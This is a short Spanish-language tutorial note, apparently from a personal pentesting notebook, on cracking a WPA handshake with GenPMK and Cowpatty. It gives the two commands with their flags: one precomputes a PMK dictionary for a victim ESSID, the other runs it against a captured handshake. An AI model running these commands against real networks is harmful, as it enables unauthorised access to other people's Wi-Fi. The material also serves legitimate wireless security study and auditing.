En este caso usaremos 2 herramientas para realizar un ataque de fuerza bruta con una rainbow table, [[GenPMK]] para la creación de claves preceptuadas y [[Cowpatty]] para el ataque de fuerza bruta.

	genpmk -f dicc.txt -d diccPreGen.genpmk -s "Essid-victima"
Creamos el diccionario pre-computado.
-f *Indicamos el diccionario*
-d *El file output* Cowpatty solo acepta archivos .genpmk
-s *El essid del AC victima*

	cowpatty -d diccPreGen.genpmk -r CapturaDeAuth-01.cap -s "Router-victima"
Realizamos el ataque
-d *Diccionario pre-computado*
-r *Captura del handshake*
